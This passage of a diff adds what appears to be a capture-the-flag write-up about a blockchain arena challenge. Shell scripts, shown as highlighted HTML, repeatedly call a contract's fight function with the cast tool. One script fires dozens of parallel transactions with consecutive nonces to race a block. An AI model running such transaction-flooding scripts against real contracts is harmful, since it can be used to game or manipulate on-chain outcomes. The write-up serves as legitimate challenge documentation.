+</span></span><span style="display:flex;"><span>  <span style="color:#d699b6">echo</span> <span style="color:#b2c98f">&#34;Fight #</span>$i<span style="color:#b2c98f">&#34;</span>
+</span></span><span style="display:flex;"><span>  cast send --rpc-url $RPC $ARENA --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">52</span> <span style="color:#d699b6">0</span>
+</span></span><span style="display:flex;"><span>  <span style="color:#d699b6">echo</span> <span style="color:#b2c98f">&#34;champion : </span><span style="color:#e67e80">$(</span>cast call --rpc-url $RPC $ARENA <span style="color:#b2c98f">&#39;isChampion(address)(bool)&#39;</span> $ADDRESS<span style="color:#e67e80">)</span><span style="color:#b2c98f">&#34;</span>
+</span></span><span style="display:flex;"><span>  sleep <span style="color:#d699b6">10</span>
+</span></span><span style="display:flex;"><span><span style="color:#e67e80">done</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div>
+</details>
+
+<p>But from time to time a request a request was crashing so I thought I just messed up my script (I&rsquo;m naive).
+<img src="https://cdn.betterttv.net/emote/60419081306b602acc5972c9/3x.webp" alt="clueless"></p>
+<p>Then my teammate got a great idea which was, making many call of <code>fight()</code> at the same block so there should be one that will be working.
+It didn&rsquo;t work either.</p>
+<details>
+  <summary style="color: #F99417; cursor: pointer">second_script.sh</summary>
+  <div class="highlight"><div style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">
+<table style="border-spacing:0;padding:0;margin:0;border:0;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 1
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 2
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 3
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 4
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 5
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 6
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 7
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 8
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a"> 9
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">10
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">11
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">12
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">13
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">14
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">15
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">16
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">17
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">18
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">19
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">20
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">21
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">22
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">23
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">24
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">25
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">26
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">27
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">28
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">29
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">30
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">31
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">32
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">33
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">34
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">35
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">36
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">37
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">38
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">39
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">40
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">41
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">42
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">43
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">44
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">45
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">46
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">47
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">48
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">49
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">50
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">51
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">52
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">53
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">54
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">55
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">56
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">57
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">58
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">59
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">60
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">61
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">62
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">63
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">64
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">65
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">66
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">67
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">68
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">69
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">70
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">71
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">72
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">73
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">74
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">75
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">76
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">77
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">78
+</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#6b655a">79
+</span></code></pre></td>
+<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
+<pre tabindex="0" style="color:#d6cbb4;background-color:#252b2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sh" data-lang="sh"><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#859289;font-style:italic">#!/bin/bash</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#d699b6">source</span> .env
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>NONCE<span style="color:#7a8478">=</span><span style="color:#e67e80">$(</span>cast nonce --rpc-url $RPC $ADDRESS<span style="color:#e67e80">)</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+0<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">31</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+1<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">32</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+2<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">33</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+3<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">34</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+4<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">35</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+5<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">36</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+6<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">37</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+7<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">38</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+8<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">39</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+9<span style="color:#e67e80">))</span>  --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">40</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+10<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">41</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+11<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">42</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+12<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">43</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+13<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">44</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+14<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">45</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+15<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">46</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+16<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">47</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+17<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">48</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+18<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">49</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+19<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">50</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+20<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">51</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+21<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">52</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+22<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">53</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+23<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">54</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+24<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">55</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+25<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">56</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+26<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">57</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+27<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">58</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+28<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">59</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+29<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">60</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+30<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">61</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+31<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">62</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+32<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">63</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+33<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">64</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+34<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">65</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+35<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">66</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+36<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">67</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+37<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">68</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+38<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">69</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+39<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">70</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+40<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">71</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+41<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">72</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+42<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">73</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+43<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">74</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+44<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">75</span> <span style="color:#d699b6">0</span> &amp;
+</span></span><span style="display:flex;"><span>cast send -r $RPC $ARENA --gas-limit <span style="color:#d699b6">10000000</span> --nonce <span style="color:#e67e80">$((</span>NONCE+45<span style="color:#e67e80">))</span> --private-key $PKEY <span style="color:#b2c98f">&#34;fight(uint8,uint8)&#34;</span> <span style="color:#d699b6">76</span> <span style="color:#d699b6">0</span> &amp;
